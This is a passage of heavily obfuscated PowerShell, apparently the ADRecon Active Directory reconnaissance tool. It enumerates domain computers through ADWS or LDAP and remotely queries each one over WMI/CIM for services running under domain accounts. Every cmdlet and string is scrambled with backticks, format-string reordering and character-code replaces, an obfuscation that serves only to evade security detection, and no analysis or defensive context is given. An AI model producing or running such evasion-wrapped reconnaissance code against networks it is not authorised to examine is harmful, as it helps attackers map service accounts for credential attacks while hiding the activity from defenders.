                            ${ser`V`I`CelIST} = @( &("{3}{2}{0}{4}{1}"-f 'C','nstance','et-','G','imI') -ClassName ("{0}{4}{3}{2}{1}" -f 'Wi','e','vic','Ser','n32_') -Property ("{1}{0}"-f'me','Na'),("{0}{2}{1}"-f'S','ame','tartN'),("{0}{1}{2}"-f 'SystemN','am','e') -CimSession ${sE`ssiOn} -ErrorAction ("{1}{0}" -f'op','St'))
                        }
                    }
                    Else
                    {
                        ${SE`SsioN} = &("{1}{2}{3}{0}"-f'sion','New','-CimS','es') -ComputerName ${h`O`StNAME} -SessionOption $(&("{4}{3}{0}{1}{2}" -f'mSe','ssion','Option','i','New-C') -Protocol ("{0}{1}" -f'DCO','M'))
                        If (${s`esSi`On})
                        {
                            ${SeR`V`ICe`lIsT} = @( &("{1}{2}{0}{3}" -f 'im','G','et-C','Instance') -ClassName ("{1}{2}{0}"-f'32_Service','Wi','n') -Property ("{0}{1}"-f 'Nam','e'),("{0}{1}" -f'StartNam','e'),("{0}{2}{1}" -f'S','me','ystemNa') -CimSession ${S`eSSiOn} -ErrorAction ("{1}{0}"-f'p','Sto') )
                        }
                    }
                }
                Else
                {
                    If (${cred`E`NTIAl} -ne  $ClF0n::"eM`PTy")
                    {
                        ${S`E`RvIcelI`ST} = @( &("{3}{1}{4}{2}{0}" -f 'ct','t-Wmi','je','Ge','Ob') -Class ("{3}{2}{0}{1}"-f 'Servic','e','in32_','W') -ComputerName ${Ho`sTNA`ME} -Credential ${CR`edeNT`I`Al} -Impersonation 3 -Property ("{0}{1}"-f 'Na','me'),("{1}{2}{0}"-f'me','Sta','rtNa'),("{3}{2}{0}{1}"-f'mN','ame','e','Syst') -ErrorAction ("{0}{1}" -f'St','op') )
                    }
                    Else
                    {
                        ${SeR`ViCel`i`St} = @( &("{2}{1}{3}{0}"-f 't','e','G','t-WmiObjec') -Class ("{0}{1}{3}{2}"-f 'Win32_Ser','v','e','ic') -ComputerName ${H`OStN`Ame} -Property ("{1}{0}" -f'ame','N'),("{1}{0}{2}"-f'tart','S','Name'),("{2}{0}{1}"-f'e','mName','Syst') -ErrorAction ("{0}{1}" -f 'Sto','p') )
                    }
                }
                ${Se`RvI`c`ELIST}
            }
            Try
            {
                If (${Tc`Pc`LIEnT}) { ${TC`pCl`ieNt}.("{1}{0}{2}" -f'dConn','En','ect').Invoke(${RE`sULt}) | &("{0}{1}{2}" -f'O','u','t-Null') }
            }
            Catch
            {
                ${w`Arning} = "$hostname ($OperatingSystem) : $($_.Exception.Message) "
            }
            ${Wa`RnINg}
        }

        Function PRoces`sco`mP`LETed`jo`Bs()
        {
            
            

            ${J`obs} = &("{0}{1}" -f 'Get-','Job') -State ("{2}{0}{1}" -f'plet','ed','Com')
            ForEach( ${j`Ob} in ${jO`BS} )
            {
                If (${N`UlL} -ne ${J`OB})
                {
                    ${Da`Ta} = &("{0}{3}{2}{1}"-f'Rec','-Job','ive','e') ${j`ob}
                    &("{2}{1}{0}" -f'e-Job','ov','Rem') ${J`Ob}
                }

                If (${D`ATA})
                {
                    If ( ${DA`TA}.("{1}{0}"-f 'pe','GetTy').Invoke() -eq [Object[]] )
                    {
                        ${S`eRVICe`lI`St} = ${dA`Ta} | &("{1}{0}{3}{2}"-f 'h','W','re-Object','e') { if (${_}."stA`RTn`A`me") { ${_} }}
                        ${SE`Rv`ICELI`ST} | &("{1}{2}{3}{0}"-f 'ect','For','E','ach-Obj') {
                            ${O`Bj} = &("{0}{1}{3}{2}" -f 'Ne','w-','t','Objec') ("{2}{0}{1}" -f'Objec','t','PS')
                            ${O`BJ} | &("{2}{1}{3}{0}" -f'Member','d','Ad','-') -MemberType ("{0}{2}{1}"-f 'Not','operty','ePr') -Name ("{1}{2}{0}"-f 'nt','A','ccou') -Value ${_}."STArT`Na`me"
                            ${O`BJ} | &("{1}{2}{0}"-f '-Member','A','dd') -MemberType ("{3}{0}{1}{2}"-f'otePr','oper','ty','N') -Name ("{3}{2}{1}{0}"-f 'me','Na','ce ','Servi') -Value ${_}."n`AMe"
                            ${o`Bj} | &("{0}{2}{1}" -f'Add-','mber','Me') -MemberType ("{0}{1}{2}" -f'N','ot','eProperty') -Name ("{2}{0}{1}" -f 'm','Name','Syste') -Value ${_}."Sy`S`TEmNaMe"
                            If (${_}."sTar`T`NAMe".("{1}{0}"-f'pper','toU').Invoke().("{0}{2}{1}" -f'C','ns','ontai').Invoke(${CUrrentd`O`maIn}))
                            {
                                ${o`Bj} | &("{0}{1}{3}{2}" -f'A','dd-Memb','r','e') -MemberType ("{0}{1}{2}"-f 'NotePr','opert','y') -Name ("{6}{2}{4}{5}{3}{1}{0}"-f 'er','ain Us','n','Dom','ning',' as ','Ru') -Value ${tr`Ue}
                            }
                            Else
                            {
                                ${o`Bj} | &("{0}{2}{1}" -f 'Ad','ber','d-Mem') -MemberType ("{0}{2}{1}" -f 'NoteP','perty','ro') -Name ("{0}{3}{4}{1}{2}"-f 'R','ai','n User','unn','ing as Dom') -Value ${FAL`se}
                            }
                            ${SCRIpT`:sErvI`CEa`CC`ouNTs} += ${O`BJ}
                        }
                    }
                    ElseIf ( ${da`TA}.("{0}{1}"-f'GetT','ype').Invoke() -eq [String] )
                    {
                        ${SCr`iPT:WA`RnI`NGs} += ${D`ATA}
                        &("{1}{2}{0}"-f'Verbose','Wri','te-') ${D`AtA}
                    }
                }
            }
        }
    }

    PROCESS
    {
        ${ScRi`Pt`:sE`RviceACc`o`UNTS} = @()
        [string[]] ${Wa`RNiN`gs} = @()
        If (${metH`OD} -eq ("{1}{0}"-f 'WS','AD'))
        {
            Try
            {
                ${a`D`DOMaIN} = &("{0}{2}{1}"-f'Get','Domain','-AD')
            }
            Catch
            {
                &("{1}{0}{3}{4}{2}" -f 'i','Wr','arning','te','-W') ("{3}{7}{2}{0}{6}{11}{9}{8}{5}{4}{1}{10}" -f 'DR',' Domain Co','-A','[Ge','tting','rviceLogon] Error ge','Dom','t','e','untsusedforS','ntext','ainAcco')
                &("{0}{1}{2}{3}" -f 'W','rite-Verb','o','se') "[EXCEPTION] $($_.Exception.Message) "
                Return ${NU`ll}
            }
            If (${Add`Oma`iN})
            {
                ${curReNT`dO`m`AIN} = ${aD`dOma`In}."nE`TBiOS`Na`mE".("{1}{0}" -f'er','toUpp').Invoke()
                &("{2}{4}{3}{1}{0}"-f'able','i','Remo','e-Var','v') ("{0}{1}" -f'AD','Domain')
            }
            Else
            {
                ${c`UrrE`NT`dOM`AIn} = ""
                &("{1}{2}{3}{0}" -f 'g','Write','-War','nin') ("{6}{3}{10}{1}{7}{8}{0}{2}{9}{4}{5}"-f 't be','cou',' retr','t Doma','eve','d.','Curren','ld',' no','i','in ')
            }

            Try
            {
                ${a`DCOM`p`UterS} = &("{0}{1}{2}"-f'Get-ADCo','mpute','r') -Filter { &("{0}{1}{2}"-f'E','nab','led') -eq ${tr`Ue} -and ("{1}{2}{0}{3}"-f 'ngSyste','Oper','ati','m') -Like ("{1}{0}{2}"-f 'i','*W','ndows*') } -Properties ("{0}{1}" -f'N','ame'),("{1}{2}{0}"-f'e','DNSHost','Nam'),("{0}{1}{3}{2}"-f'Oper','ating','m','Syste')
            }
            Catch
            {
                &("{3}{1}{0}{2}"-f'rnin','rite-Wa','g','W') ("{19}{12}{13}{3}{8}{17}{6}{4}{5}{10}{2}{18}{15}{9}{16}{1}{0}{11}{7}{14}" -f ' Window','ting','ceLogon','ai','o','rServ','f','ter Obj','nAccounts','r','i','s Compu','Ge','t-ADRDom','ects','Error while enume','a','used','] ','[')
                &("{2}{1}{0}{3}"-f'bos','r','Write-Ve','e') "[EXCEPTION] $($_.Exception.Message) "
                Return ${nU`LL}
            }

            If (${ad`c`oM`PUTErS})
            {
                
                
                ${c`NT} = $( (  lS ("va"+"RiAbL"+"e:9B5p6")).VAlue::("{1}{0}{3}{2}"-f'ctC','Obje','unt','o').Invoke(${aD`cO`mp`UTers}))
                &("{3}{2}{0}{1}"-f'os','e','e-Verb','Writ') ('['+'*] '+'Tot'+'al'+' '+'Wi'+'ndo'+'ws '+'Ho'+'sts'+': '+"$cnt")
                ${i`CnT} = 0
                ${a`d`COmputERs} | &("{3}{0}{4}{2}{1}"-f'Each-','ct','je','For','Ob') {
                    ${stoP`wa`TcH} =   (  Gi ('varIAb'+'lE:'+'3'+'iDH')  ).VaLuE::("{1}{2}{0}"-f 'ew','S','tartN').Invoke()
                    If( ${_}."Dn`S`HOS`TNaMe" )
	                {
                        ${a`RGs} = @(${_}."dNSH`OS`T`NAme", ${_}."OPErAtin`gSy`s`T`em", ${cR`eDe`Nt`IAL})
		                &("{1}{0}{2}"-f 'J','Start-','ob') -ScriptBlock ${READsE`R`VI`CEa`cCo`UntS} -Name "read_$($_.name)" -ArgumentList ${Ar`Gs} | &("{0}{1}"-f 'O','ut-Null')
		                ++${ic`NT}
		                If (${sToP`w`ATch}."e`lAp`SED"."T`OtAL`M`ILL`iSECONdS" -ge 1000)
                        {
                            &("{2}{0}{1}"-f'Pr','ogress','Write-') -Activity ("{3}{1}{6}{4}{2}{5}{0}" -f'rs','g data','m','Retrievin','fro',' serve',' ') -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            ${sto`P`wAtCH}.("{1}{0}" -f'set','Re').Invoke()
                            ${ST`OPwA`Tch}.("{1}{0}"-f 'rt','Sta').Invoke()
		                }
                        while ( ( &("{1}{0}"-f'b','Get-Jo') -State ("{1}{0}"-f'ng','Runni'))."Co`Unt" -ge ${THr`eA`DS} ) { &("{2}{3}{1}{0}"-f '-Sleep','t','St','ar') -Seconds 3 }
		                &("{1}{2}{4}{0}{3}" -f't','processComp','l','edJobs','e')
	                }
                }

                

                &("{0}{1}{2}{3}"-f'Writ','e-P','rogres','s') -Activity ("{6}{0}{7}{3}{1}{4}{2}{5}"-f'et','ng data fro',' ser','i','m','vers','R','riev') -Status ("{10}{5}{8}{2}{4}{9}{3}{7}{0}{1}{11}{6}"-f'nd jobs t','o compl','ing for','o',' back','i','e...','u','t','gr','Wa','et') -PercentComplete 100
                &("{2}{1}{0}"-f't-Job','ai','W') -State ("{1}{2}{0}"-f'g','Runni','n') -Timeout 30  | &("{0}{1}{2}"-f 'O','ut-','Null')
                &("{1}{0}{2}"-f'et-Jo','G','b') -State ("{2}{1}{0}" -f 'ing','unn','R') | &("{0}{1}" -f 'St','op-Job')
                &("{0}{2}{3}{4}{1}" -f 'pr','Jobs','ocessCompl','e','ted')
                &("{3}{2}{0}{4}{1}" -f 'Prog','ess','-','Write','r') -Activity ("{3}{5}{6}{2}{0}{4}{1}" -f ' from ','rvers','ta','Re','se','trieving d','a') -Completed -Status ("{1}{2}{0}" -f 'e','All D','on')
            }
        }

        If (${meT`hOD} -eq ("{0}{1}" -f'L','DAP'))
        {
            ${CurRenT`do`ma`in} = ([string](${OB`JdoM`AIN}."N`AmE")).("{2}{0}{1}" -f'ppe','r','toU').Invoke()

            ${oBJse`Ar`chEr} = &("{1}{2}{0}"-f'ect','New-Ob','j') ("{3}{0}{4}{1}{5}{2}{7}{6}" -f 'D','ectoryService','.','System.','ir','s','orySearcher','Direct') ${o`BJd`oMAin}
            ${OBJ`seA`RcHER}."P`AG`esIZE" = ${PaG`esI`zE}
            ${o`BJ`sea`RCheR}."fIL`TEr" = ((("{17}{14}{0}{11}{19}{12}{16}{4}{7}{18}{3}{2}{1}{9}{6}{5}{13}{15}{10}{8}"-f'63',':=2','3','.4.80','8','Sy','ng','40.1','ows*))',')(operati','d','69)(!userAc','nt','stem=*','countType=80530','Win','Control:1.2.','(&(samAc','13556.1','cou')))
            ${obj`s`ea`RCHeR}."p`ROPErtiE`s`Tol`OAd".("{1}{0}{2}" -f'dRang','Ad','e').Invoke((("{1}{0}"-f 'me','na'),("{2}{1}{0}"-f 'name','host','dns'),("{0}{1}{2}{4}{3}"-f'ope','ratin','gsys','em','t')))
            ${objseaR`C`heR}."Sea`R`cHsCope" = ("{0}{1}{2}"-f'Su','btr','ee')

            Try
            {
                ${A`dcOMPu`TErS} = ${o`B`J`sEaRCher}.("{1}{0}" -f 'indAll','F').Invoke()
            }
            Catch
            {
                &("{1}{0}{2}" -f 'rit','W','e-Warning') ("{19}{10}{12}{20}{15}{9}{6}{25}{0}{7}{23}{8}{5}{2}{11}{14}{1}{18}{3}{24}{13}{16}{17}{21}{4}{22}"-f's','or','on] E','hile en','ect','Log','n','e','Service','ou','e','r','t-A','rating ','r','nAcc','Win','dows Computer Ob',' w','[G','DRDomai','j','s','dfor','ume','tsu')
                &("{3}{0}{2}{4}{1}" -f'rite-V','e','erbo','W','s') "[EXCEPTION] $($_.Exception.Message) "
                Return ${N`ULL}
            }
            ${ob`J`SEAR`cheR}.("{1}{0}"-f'ose','disp').Invoke()

            If (${aDC`o`mPUte`Rs})
            {
                
                
                ${c`NT} = $(  ( cHILDITeM  vARiaBle:olxE  ).VaLue::("{1}{0}{2}" -f'bjectCoun','O','t').Invoke(${adCOMP`U`TeRs}))
                &("{0}{1}{2}{3}" -f'Wri','te-','Ve','rbose') ('[*'+'] '+'Tot'+'al'+' '+'Windo'+'w'+'s '+'Ho'+'s'+'ts: '+"$cnt")
                ${i`CNt} = 0
                ${aDcom`P`UTeRS} | &("{0}{1}{2}"-f 'Fo','r','Each-Object') {
                    If( ${_}."pR`OP`ertIES"."d`NShos`T`NAme" )
	                {
                        ${A`RGS} = @(${_}."PR`opERt`Ies"."DNshO`ST`NAME", ${_}."prO`p`ER`TieS"."OPeRAtiN`G`SYS`TEM", ${c`Re`Den`TiAL})
		                &("{1}{2}{0}" -f 'b','Start-J','o') -ScriptBlock ${Reads`ERvi`cEa`c`couNts} -Name "read_$($_.Properties.name)" -ArgumentList ${AR`GS} | &("{0}{1}{2}" -f 'O','ut-N','ull')
		                ++${I`cNT}
		                If (${S`To`P`wAtCH}."e`Lap`Sed"."tota`lmi`LL`ISEc`O`NDs" -ge 1000)
                        {
		                    &("{1}{0}{2}"-f'Progres','Write-','s') -Activity ("{6}{5}{0}{1}{2}{3}{4}"-f'n','g da','ta from ','se','rvers','etrievi','R') -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            ${s`ToPW`At`Ch}.("{0}{1}"-f 'Re','set').Invoke()
                            ${St`OpWat`CH}.("{0}{1}" -f'Star','t').Invoke()
		                }
		                while ( ( &("{1}{0}"-f'et-Job','G') -State ("{0}{1}"-f'Ru','nning'))."c`OUnt" -ge ${T`hre`ADS} ) { &("{3}{0}{1}{2}" -f 'tar','t','-Sleep','S') -Seconds 3 }
		                &("{2}{1}{3}{4}{0}"-f'Jobs','essCo','proc','mple','ted')
	                }
                }

                
                &("{3}{0}{2}{1}{4}" -f't','res','e-Prog','Wri','s') -Activity ("{7}{2}{0}{3}{6}{5}{1}{4}" -f'v','m serv','etrie','ing dat','ers',' fro','a','R') -Status ("{8}{0}{5}{4}{2}{7}{10}{3}{9}{6}{1}"-f'ait','te...','ba','groun','for ','ing ','obs to comple','c','W','d j','k') -PercentComplete 100
                &("{0}{1}"-f 'Wait-J','ob') -State ("{0}{1}"-f'Runn','ing') -Timeout 30  | &("{1}{2}{0}"-f'l','O','ut-Nul')
                &("{1}{0}" -f 'Job','Get-') -State ("{0}{1}" -f 'Runni','ng') | &("{0}{1}" -f 'S','top-Job')
                &("{1}{0}{4}{3}{2}"-f 'o','processC','s','tedJob','mple')
                &("{2}{1}{0}{3}" -f'te-Prog','i','Wr','ress') -Activity ("{6}{2}{4}{1}{0}{7}{5}{3}" -f 'o','fr','ving data','ers',' ','serv','Retrie','m ') -Completed -Status ("{0}{1}" -f 'All',' Done')
            }
        }

        If (${S`c`RIPt:ser`VicEAC`COu`NtS})
        {
            Return ${S`CrI`pT:SErVI`Cea`C`coU`NtS}
        }
        Else
        {
            Return ${nu`Ll}
        }
    }
}

Function removE`-E`mP`TYA`d`R`OUt`PUTDIR
{

    param(
        [Parameter(Mandatory = ${t`RUE})]
        [string] ${Ad`ROutp`Utd`ir},

        [Parameter(MaNdatORY = ${T`Rue})]
        [array] ${oUTP`UtTY`PE}
    )

    Switch (${OutpU`TT`y`pe})
    {
        'CSV'
        {
            ${CSv`PatH}  = -join(${AdRoUt`P`UtDIR},'\',("{1}{0}{2}"-f'ile','CSV-F','s'))
            If (!(&("{0}{1}{2}"-f 'Test-Pa','t','h') -Path ((("{2}{1}{0}{3}{4}"-f 't','VPa','{1}CS','h','{0}*'))  -f  [CHAr]92,[CHAr]36)))
            {
                &("{0}{2}{1}{3}"-f'Wri','o','te-Verb','se') ('R'+'e'+'moved '+'Em'+'pty'+' '+'Direc'+'tory'+' '+"$CSVPath")
                &("{1}{0}{2}" -f 'mov','Re','e-Item') ${Cs`V`PAth}
            }
        }
        'XML'
        {
            ${xMl`p`ATH}  = -join(${aDROU`Tp`U`TDIr},'\',("{0}{2}{1}"-f'XML','iles','-F'))
            If (!(&("{0}{1}{2}" -f'T','est-Pat','h') -Path ((("{3}{2}{0}{1}" -f 'a','thASZ*','1XMLP','9d'))-crEplacE([chAR]65+[chAR]83+[chAR]90),[chAR]92  -rEPLaCe '9d1',[chAR]36)))
            {
                &("{3}{0}{2}{1}"-f 'Ve','se','rbo','Write-') ('Re'+'m'+'oved '+'E'+'mpt'+'y '+'Direct'+'or'+'y '+"$XMLPath")
                &("{1}{0}{2}"-f 'e','Remov','-Item') ${x`mlPa`TH}
            }
        }
        ("{0}{1}"-f 'JS','ON')
        {
            ${jsonP`AtH}  = -join(${AD`R`ou`TPuTD`ir},'\',("{2}{0}{1}"-f'N-F','iles','JSO'))
            If (!(&("{2}{1}{0}"-f'Path','-','Test') -Path ((("{0}{2}{1}"-f '7','hTIq*','HZJSONPat')) -rEplacE ([ChAr]55+[ChAr]72+[ChAr]90),[ChAr]36 -rEplacE 'TIq',[ChAr]92)))
            {
                &("{3}{0}{1}{2}"-f'Ve','rbo','se','Write-') ('Remov'+'ed '+'Empty'+' '+'Direct'+'ory'+' '+"$JSONPath")
                &("{1}{2}{3}{0}"-f'm','R','emove','-Ite') ${js`o`NpAth}
            }
        }
        ("{1}{0}"-f 'ML','HT')
        {
            ${h`TmLP`AtH}  = -join(${aD`R`ouT`pUtDIR},'\',("{2}{0}{1}"-f'-Fi','les','HTML'))
            If (!(&("{2}{0}{1}" -f 'est-Pat','h','T') -Path (("{4}{0}{2}{1}{3}"-f'HT','LPathG','M','Kn*','4g3'))."R`ep`LAce"(([chAr]71+[chAr]75+[chAr]110),[STriNG][chAr]92).("{1}{0}" -f'PLACE','Re').Invoke('4g3','$')))
            {
                &("{3}{2}{0}{1}" -f 'Verbo','se','te-','Wri') ('R'+'emove'+'d '+'E'+'mpty'+' '+'Direc'+'tor'+'y '+"$HTMLPath")
                &("{2}{1}{0}{3}" -f '-It','ve','Remo','em') ${H`TmlpA`Th}
            }
        }
    }
    If (!(&("{1}{0}{2}"-f 's','Te','t-Path') -Path ((("{0}{2}{1}{4}{5}{3}"-f 'athAD','ut','RO','ruz2*','putD','i'))  -cREPlacE([ChaR]117+[ChaR]122+[ChaR]50),[ChaR]92 -REpLaCe  ([ChaR]97+[ChaR]116+[ChaR]104),[ChaR]36)))
    {
        &("{1}{3}{0}{2}" -f '-','Remov','Item','e') ${aDr`O`UtPU`TDir}
        &("{1}{3}{2}{0}" -f'e','Write-V','bos','er') ('Re'+'mo'+'ved '+'Em'+'pty '+'Direc'+'tory'+' '+"$ADROutputDir")
    }
}

Function gE`T-A`dRABouT
{

    param(
        [Parameter(maNdATory = ${t`Rue})]
        [string] ${ME`THOd},

        [Parameter(maNDAtORy = ${TR`Ue})]
        [DateTime] ${DA`TE},

        [Parameter(MandATORy = ${T`Rue})]
        [string] ${a`DRecon`Ver`Si`on},

        [Parameter(manDatorY = ${fA`lsE})]
        [Management.Automation.PSCredential] ${cr`eDE`NTi`AL} =   $CLf0n::"e`MPty",

        [Parameter(mandATOrY = ${Tr`Ue})]
        [string] ${rAnON`cOm`Pu`TEr},

        [Parameter(ManDaTory = ${t`RuE})]
        [string] ${TOTA`l`Ti`ME}
    )

    ${ABouTAD`ReC`On} = @()

    ${vE`RSIOn} = ${m`Et`hoD} + ("{1}{0}"-f 'n',' Versio')

    If (${Creden`T`ial} -ne   ( gET-varIAbLE CLf0n ).vALUe::"emP`Ty")
    {
        ${uSE`RNA`Me} = $(${crEDEN`T`I`AL}."usERNA`me")
    }
    Else
    {
        ${use`RNa`me} = $(  $AboZ::"Use`Rname")
    }

    ${Ob`JV`ALUES} = @(("{0}{1}" -f'D','ate'), $(${DA`Te}), ("{1}{0}" -f'on','ADRec'), ("{1}{3}{5}{0}{2}{4}"-f '/adreco','https://gi','n','th','/ADRecon','ub.com'), ${V`ERs`Ion}, $(${aDrECo`N`Ver`SIoN}), ("{0}{1}{2}" -f 'Ra','n',' as user'), ${use`R`Name}, ("{1}{2}{0}{3}" -f' com','Ran',' on','puter'), ${RA`NoN`Com`putEr}, (("{4}{1}{5}{6}{3}{0}{2}"-f'm','e','ins)',' (','Ex','cution',' Time')), $(${ToTA`L`T`IMe}))

    For (${I} = 0; ${I} -lt $(${objv`A`lUeS}."cou`Nt"); ${I}++)
    {
        ${o`Bj} = &("{2}{1}{0}" -f'ct','ew-Obje','N') ("{1}{0}{2}" -f'Obj','PS','ect')
        ${O`BJ} | &("{1}{0}{2}"-f 'Me','Add-','mber') -MemberType ("{1}{3}{2}{0}"-f 'y','No','ePropert','t') -Name ("{2}{1}{0}"-f'ry','go','Cate') -Value ${o`BJ`V`AluES}[${i}]
        ${O`Bj} | &("{1}{2}{0}"-f 'ber','Add-','Mem') -MemberType ("{1}{3}{0}{2}"-f'Pr','Not','operty','e') -Name ("{1}{0}"-f'ue','Val') -Value ${oB`J`VALUES}[${i}+1]
        ${I}++
        ${AB`oUTa`DReC`on} += ${o`BJ}
    }
    Return ${AbOU`TA`DrEcON}
}

Function inv`O`KE-`AdReCON
{

    param(
        [Parameter(maNdatORy = ${f`AlsE})]
        [string] ${g`eNex`CEL},

        [Parameter(MaNdATory = ${fA`LSe})]
        [ValidateSet({"{0}{1}"-f 'A','DWS'}, {"{0}{1}" -f'LDA','P'})]
        [string] ${ME`ThoD} = ("{0}{1}"-f 'ADW','S'),

        [Parameter(mAndaToRy = ${f`AlSe})]
        [array] ${CoL`lE`Ct} = ("{0}{1}" -f 'Defau','lt'),

        [Parameter(MANdATORY = ${fa`Lse})]
        [string] ${D`OM`Ai`N`conTROLlER} = '',

        [Parameter(MAnDATORY = ${Fa`l`SE})]
        [Management.Automation.PSCredential] ${c`RE`DE`NtiAl} =  (  Get-item  ('vaRiAbl'+'E:'+'cLF0'+'N')).VaLUe::"em`pTy",

        [Parameter(mandATory = ${FAL`Se})]
        [array] ${o`UTpuT`TY`PE} = {"{1}{2}{0}"-f 'lt','Def','au'},

        [Parameter(mandatorY = ${f`A`Lse})]
        [string] ${Ad`ROu`TpUT`dir},

        [Parameter(mAndATOrY = ${Fa`lsE})]
        [int] ${DOr`mAn`TTiMe`sP`An} = 90,

        [Parameter(maNDATorY = ${f`AlSe})]
        [int] ${PAS`S`MA`xagE} = 30,

        [Parameter(mandatOry = ${faL`sE})]
        [int] ${Pa`GesI`ze} = 200,

        [Parameter(ManDAtOrY = ${fa`L`se})]
        [int] ${t`hrea`DS} = 10,

        [Parameter(mANDATory = ${F`A`lSe})]
        [bool] ${onLYe`Nab`LEd} = ${fA`LSe},

        [Parameter(manDatORy = ${FA`l`sE})]
        [bool] ${USEal`T`CREDs} = ${F`Alse},

        [Parameter(MaNDaTOrY = ${FA`L`Se})]
        [ValidateSet({"{2}{0}{1}"-f'ec','on','ADR'}, {"{0}{1}"-f 'Cybe','rCX'}, {"{0}{1}"-f 'Pay','atu'})]
        [string] ${L`ogO} = ("{2}{0}{1}"-f 'D','Recon','A')
    )

    If (${PsvE`RSiOnta`BLE}."Ps`eD`i`TIoN" -eq ("{1}{0}"-f'ore','C'))
    {
        If (${psveR`Sio`Nta`BLE}."PLAt`FoRm" -ne ("{0}{2}{1}"-f 'Wi','2NT','n3'))
        {
            &("{2}{3}{1}{0}" -f 'rning','a','Wri','te-W') ("{12}{7}{0}{1}{8}{11}{3}{10}{4}{2}{9}{6}{13}{5}{14}"-f 'Rec','o','t ','r','ently no','xi','ted ','Invoke-AD','n] ','suppor','r','Cu','[','... E','ting')
            Return ${NU`lL}
        }
    }

    [string] ${ADRecOnv`eRsi`on} = ("{0}{1}" -f 'v1.','27')
    &("{2}{0}{3}{1}" -f 'Outp','t','Write-','u') ('[*'+'] '+'A'+'DR'+'econ '+"$ADReconVersion "+'b'+'y '+'Prashan'+'t'+' '+'Mah'+'aja'+'n '+'(@p'+'rashan'+'t'+'3535'+')')

    If (${GENE`Xc`eL})
    {
        If (-Not (&("{0}{2}{1}"-f'Tes','-Path','t') ${GeN`ex`cel}))
        {
            &("{0}{3}{2}{1}" -f'Wr','ut','Outp','ite-') ("{7}{8}{5}{0}{3}{4}{6}{1}{2}" -f'i','h',' ... Exiting','d ','Pa','on] Inval','t','[Invoke-A','DRec')
            Return ${nu`Ll}
        }
        &("{3}{0}{2}{1}" -f't','ADRExcel','-','Expor') -ExcelPath ${G`enEx`cel} -Logo ${L`ogo}
        Return ${N`ULL}
    }

    
    ${s`AVE`Ve`Rbos`e`PrefeRE`Nce} = ${s`C`Ri`PT`:`VeRbo`sEPrEF`ErENce}
    ${S`Cri`PT`:VERbOs`EPrE`FERE`NCE} = ("{0}{3}{2}{1}"-f'Silentl','e','ntinu','yCo')
    Try
    {
        If (${PSverSIo`Nt`Ab`le}."PS`Ve`RSioN"."M`AjOr" -ne 2)
        {
            ${C`OmPUT`Er} = &("{3}{4}{0}{1}{2}"-f 'st','anc','e','Get-C','imIn') -ClassName ("{1}{3}{2}{0}" -f 'stem','Win','y','32_ComputerS')
            ${comP`Ut`eRDOmaInr`oLe} = (${COMp`UT`ER})."do`M`Ain`ROLe"
        }
        Else
        {
            ${COm`PuT`ER} = &("{0}{1}{2}"-f'Get','-WMI','Object') ("{5}{4}{2}{6}{1}{0}{3}" -f 'rsyste','e','omp','m','2_c','win3','ut')
            ${COM`pU`TE`RdoMainrOLE} = (${coM`pU`TEr})."DO`MAI`Nrole"
        }
    }
    Catch
    {
        &("{3}{2}{0}{1}" -f'-Ou','tput','rite','W') "[Invoke-ADRecon] $($_.Exception.Message) "
    }
    If (${s`AvEveRbO`SeprEfe`RE`N`ce})
    {
        ${sC`R`Ipt`:VEr`B`OsEPr`EFereNCe} = ${s`AVe`VerbO`sePR`eFErencE}
        &("{2}{4}{0}{3}{1}" -f '-V','iable','Re','ar','move') ("{1}{2}{5}{0}{3}{4}" -f 'ref','Save','V','e','rence','erboseP')
    }

    switch (${c`O`mp`U`TeRdomaINR`ole})
    {
        0
        {
            [string] ${COMp`U`TE`RRolE} = ("{2}{1}{4}{0}{3}"-f'one Workstat','and','St','ion','al')
            ${eN`V:`ADp`s_L`OAddeF`A`ULTd`Rive} = 0
            ${useAL`Tcre`DS} = ${t`RUE}
        }
        1 { [string] ${c`omPuTE`RROlE} = ("{3}{1}{2}{0}" -f'ion','mber Workst','at','Me') }
        2
        {
            [string] ${Compu`TERR`o`lE} = ("{4}{0}{2}{3}{1}"-f'd','Server','alon','e ','Stan')
            ${Us`E`ALtc`REDS} = ${T`RuE}
            ${EnV:`AdpS_`loA`dd`eFAulT`dRIVE} = 0
        }
        3 { [string] ${c`oM`PUte`RROle} = ("{0}{3}{2}{1}" -f 'M','r Server','e','emb') }
        4 { [string] ${CoM`P`UterR`ole} = ("{1}{4}{7}{5}{3}{6}{2}{0}"-f'er','Ba','ll','ma','cku',' Do','in Contro','p') }
        5 { [string] ${coMP`U`TErROle} = ("{3}{1}{4}{2}{6}{5}{0}"-f'er','mar','nt','Pri','y Domain Co','l','rol') }
        default { &("{0}{2}{1}{3}"-f 'Wri','e-Outp','t','ut') ("{8}{4}{1}{6}{0}{7}{5}{3}{2}"-f' ','Role could not','ed.','i','puter ','ntif',' be','ide','Com') }
    }

    ${ra`NOnC`O`m`PUteR} = "$($computer.domain)\$([Environment]::MachineName) - $($computerrole) "
    &("{1}{2}{3}{0}" -f'e','Rem','o','ve-Variabl') ("{2}{0}{1}"-f 'm','puter','co')
    &("{4}{2}{3}{0}{1}" -f 'ari','able','move-','V','Re') ("{2}{3}{1}{0}" -f 'e','erdomainrol','com','put')
    &("{2}{0}{1}" -f 'e-Variab','le','Remov') ("{2}{0}{1}" -f 'omp','uterrole','c')

    
    If ((${domaInco`NT`R`o`lLER} -ne "") -or (${cR`e`DenTIaL} -ne   (get-VARIAbLE ("cLf0"+"n")  -vAlUe  )::"em`pty"))
    {
        
        If ((${m`etHOD} -eq ("{0}{1}" -f'A','DWS')) -and (-Not ${U`sEaLTc`REdS}))
        {
            ${eN`V`:AdPS_`lOADde`F`AUlT`DRIVe} = 0
        }
        ${USEal`T`CredS} = ${t`RuE}
    }

    
    If (${m`EthOd} -eq ("{1}{0}" -f 'DWS','A'))
    {
        If (&("{0}{1}{2}" -f'Get-','M','odule') -ListAvailable -Name ("{0}{1}{3}{2}"-f 'A','ctiveDi','ory','rect'))
        {
            Try
            {
                
                ${sA`V`eVEr`BOs`ep`REf`eRenCE} = ${sCr`IPT:vErB`OSEprE`F`E`REN`CE};
                ${ScRIpt:`VER`BO`SePre`FE`Re`N`CE} = ("{3}{1}{0}{2}{4}"-f'lent','i','lyConti','S','nue');
